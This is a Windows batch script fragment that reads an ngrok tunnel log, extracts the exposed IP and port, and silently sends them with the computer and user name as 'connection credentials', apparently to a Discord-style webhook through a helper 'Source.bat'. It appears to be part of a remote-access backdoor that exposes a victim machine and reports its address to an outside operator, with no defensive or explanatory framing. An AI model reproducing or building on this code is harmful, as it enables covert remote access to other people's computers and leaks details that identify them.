setlocal enabledelayedexpansion

set "LogFile=%temp%\log\ngrok.log"
for /f "delims=" %%a in (!LogFile!) do echo %%a | findstr /c:"url=" >nul && set "Result=%%a"
for /f "tokens=8 delims==" %%a in ("!Result!") do (
    for /f "tokens=2 delims=/" %%b in ("%%a") do set RemoteURL=%%b
)

set "webhook="

Source.bat +silent --embed "Connection credentials for %computername%\%username%:" ":satellite_orbital: **IP and port:** !RemoteURL!" "FFFDBC"